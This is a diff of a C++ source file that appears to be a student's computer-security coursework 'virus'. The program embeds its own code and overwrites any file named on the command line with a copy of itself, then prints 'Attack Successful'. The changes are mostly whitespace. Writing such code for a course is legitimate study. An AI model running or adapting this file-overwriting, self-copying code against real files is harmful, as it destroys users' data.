@@ -5,8 +5,7 @@
 #include <fstream>
 #include <cstring>
 
-std::string code = "\
-// COMP3632 Assignment 1 virus2.cpp\n\
+std::string code = "// COMP3632 Assignment 1 virus2.cpp\n\
 // Dhesant Nakka | 20146587\n\
 \n\
 #include <iostream>\n\
@@ -65,12 +64,11 @@ int main (int argc, char** argv) {\n\
     std::cout << \"Attack Successful. Have a nice day!\" << std::endl;\n\
     \n\
     return 0;\n\
-}\
-";
+}";
 
 std::string escape_string(std::string in) {
     std::string out;
-
+    
     for (std::size_t i = 0; i < in.size(); ++i) {
 	if (in[i] == '\\')
 	    out += "\\\\";
@@ -91,24 +89,23 @@ int main (int argc, char** argv) {
 	std::cout << "No target specified" << std::endl;
 	return 1;
     }
-
     
     std::cout << "Opening: " << argv[1] << std::endl;
-
+    
     std::fstream fs;
     fs.open(argv[1], std::fstream::out | std::fstream::trunc);
-
+    
     if (!fs.is_open()) {
 	std::cout << "File opening failed" << std::endl;
 	return 1;
     }
     
     std::size_t pos = code.find("@@");
-
+    
     std::string token = code.substr(0,pos);
-
+    
     fs.write(token.c_str(), token.size());
-
+    
     token = escape_string(code);
     fs.write(token.c_str(), token.size());
     
@@ -117,6 +114,6 @@ int main (int argc, char** argv) {
     
     fs.close();
     std::cout << "Attack Successful. Have a nice day!" << std::endl;
-
+    
     return 0;
 }
